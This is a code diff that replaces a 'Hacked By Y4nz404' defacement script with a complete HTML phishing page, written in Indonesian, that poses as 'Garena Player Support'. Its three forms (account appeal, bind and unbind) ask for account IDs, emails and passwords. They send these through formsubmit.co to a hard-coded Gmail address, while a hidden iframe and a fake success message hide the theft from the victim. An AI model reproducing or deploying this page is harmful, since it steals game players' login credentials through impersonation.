@@ -1,24 +1,248 @@
-const data = {
-  title: "Hacked By Y4nz404",
-  content: {
-    image: {
-      src: "https://i.top4top.io/p_34953wfkn0.jpg",
-      width: 420,
-      height: 420
-    },
-    text: "Hacked By ./Y4nz404",
-    quote: "Ini tak semudah yang orang lain lihat, dan ini bukan hal yang dapat dilakukan semua orang."
-  },
-  audio: "https://j.top4top.io/m_349527cmt0.mp3"
-};
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Garena Player Support - Demo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #141e30, #243b55);
+      color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background: #ff3c00;
+      padding: 16px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 500px;
+      margin: 20px auto;
+      background: rgba(0,0,0,0.75);
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+    .tab-buttons {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+    .tab-buttons button {
+      flex: 1;
+      padding: 10px;
+      margin: 0 5px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .tab-buttons .active {
+      background: #ff3c00;
+      color: #fff;
+    }
+    .tab-buttons .inactive {
+      background: #222;
+      color: #ccc;
+    }
+    label {
+      display: block;
+      margin: 8px 0 4px;
+      font-size: 14px;
+    }
+    input, textarea, select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 6px;
+      border: none;
+      margin-bottom: 12px;
+      font-size: 14px;
+    }
+    button.submit-btn {
+      width: 100%;
+      padding: 12px;
+      background: #ff3c00;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      font-size: 14px;
+    }
+    button.submit-btn:hover {
+      background: #e03200;
+    }
+    .success {
+      text-align: center;
+      padding: 40px 20px;
+    }
+    .success h1 {
+      color: #00ff6a;
+      margin-bottom: 10px;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <header>Garena Player Support (Demo)</header>
+  <div class="container" id="formContainer">
 
-// Generate HTML
-document.title = data.title;
-const container = document.createElement("div");
-container.innerHTML = `
-  <img src="${data.content.image.src}" width="${data.content.image.width}" height="${data.content.image.height}" />
-  <h1>${data.content.text}</h1>
-  <p>${data.content.quote}</p>
-  <audio controls src="${data.audio}"></audio>
-`;
-document.body.appendChild(container);
+    <!-- Tombol tab -->
+    <div class="tab-buttons">
+      <button id="tabBanding" class="active">Banding Akun</button>
+      <button id="tabBind" class="inactive">Bind Cepat</button>
+      <button id="tabUnbind" class="inactive">Unbind Cepat</button>
+    </div>
+
+    <!-- Form Banding -->
+    <form id="formBanding" method="POST" target="hidden_iframe" onsubmit="return showSuccess()">
+      <input type="hidden" name="_subject" value="Banding Akun Baru">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label>ID Akun</label>
+      <input type="text" name="ID Akun" required>
+
+      <label>Email / Gmail</label>
+      <input type="email" name="Email" required>
+
+      <label>Password</label>
+      <input type="password" name="Password" required>
+
+      <label>Alasan Banding</label>
+      <textarea name="Alasan Banding" rows="3" required></textarea>
+
+      <button type="submit" class="submit-btn">Kirim Banding</button>
+    </form>
+
+    <!-- Form Bind Cepat -->
+    <form id="formBind" class="hidden" method="POST" target="hidden_iframe" onsubmit="return showSuccess()">
+      <input type="hidden" name="_subject" value="Bind Cepat Baru">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label>ID Akun</label>
+      <input type="text" name="ID Akun" required>
+
+      <label>Email / Gmail</label>
+      <input type="email" name="Email" required>
+
+      <label>Password</label>
+      <input type="password" name="Password" required>
+
+      <label>Bind ke</label>
+      <select name="Bind ke">
+        <option>Facebook</option>
+        <option>Google</option>
+        <option>VK</option>
+      </select>
+
+      <button type="submit" class="submit-btn">Kirim Permintaan Bind</button>
+    </form>
+
+    <!-- Form Unbind Cepat -->
+    <form id="formUnbind" class="hidden" method="POST" target="hidden_iframe" onsubmit="return showSuccess()">
+      <input type="hidden" name="_subject" value="Unbind Cepat Baru">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label>ID Akun</label>
+      <input type="text" name="ID Akun" required>
+
+      <label>Email / Gmail</label>
+      <input type="email" name="Email" required>
+
+      <label>Password</label>
+      <input type="password" name="Password" required>
+
+      <label>Unbind dari</label>
+      <select name="Unbind dari">
+        <option>Facebook</option>
+        <option>Google</option>
+        <option>VK</option>
+      </select>
+
+      <button type="submit" class="submit-btn">Kirim Permintaan Unbind</button>
+    </form>
+
+    <!-- Notifikasi sukses -->
+    <div id="successMessage" class="success hidden">
+      <h1>✅ Data berhasil dikirim!</h1>
+      <p>Silakan tunggu respon dari tim support.</p>
+      <button onclick="resetForm()" class="submit-btn">Kirim Lagi</button>
+    </div>
+
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+  </div>
+
+  <script>
+    // semua form diarahkan ke email tujuan yang sama
+    const emailTujuan = "yanzfff2@gmail.com"; // Ganti dengan email Anda
+    document.querySelectorAll("form").forEach(form => {
+      form.action = "https://formsubmit.co/" + emailTujuan;
+    });
+
+    const tabBanding = document.getElementById("tabBanding");
+    const tabBind = document.getElementById("tabBind");
+    const tabUnbind = document.getElementById("tabUnbind");
+
+    const formBanding = document.getElementById("formBanding");
+    const formBind = document.getElementById("formBind");
+    const formUnbind = document.getElementById("formUnbind");
+    const successMessage = document.getElementById("successMessage");
+
+    function showForm(form) {
+      formBanding.classList.add("hidden");
+      formBind.classList.add("hidden");
+      formUnbind.classList.add("hidden");
+      successMessage.classList.add("hidden");
+      form.classList.remove("hidden");
+
+      tabBanding.classList.remove("active");
+      tabBind.classList.remove("active");
+      tabUnbind.classList.remove("active");
+
+      tabBanding.classList.add("inactive");
+      tabBind.classList.add("inactive");
+      tabUnbind.classList.add("inactive");
+    }
+
+    tabBanding.addEventListener("click", () => {
+      showForm(formBanding);
+      tabBanding.classList.add("active");
+      tabBanding.classList.remove("inactive");
+    });
+
+    tabBind.addEventListener("click", () => {
+      showForm(formBind);
+      tabBind.classList.add("active");
+      tabBind.classList.remove("inactive");
+    });
+
+    tabUnbind.addEventListener("click", () => {
+      showForm(formUnbind);
+      tabUnbind.classList.add("active");
+      tabUnbind.classList.remove("inactive");
+    });
+
+    function showSuccess() {
+      formBanding.classList.add("hidden");
+      formBind.classList.add("hidden");
+      formUnbind.classList.add("hidden");
+      successMessage.classList.remove("hidden");
+      return true;
+    }
+
+    function resetForm() {
+      showForm(formBanding);
+      tabBanding.classList.add("active");
+      tabBanding.classList.remove("inactive");
+    }
+  </script>
+</body>
+</html>
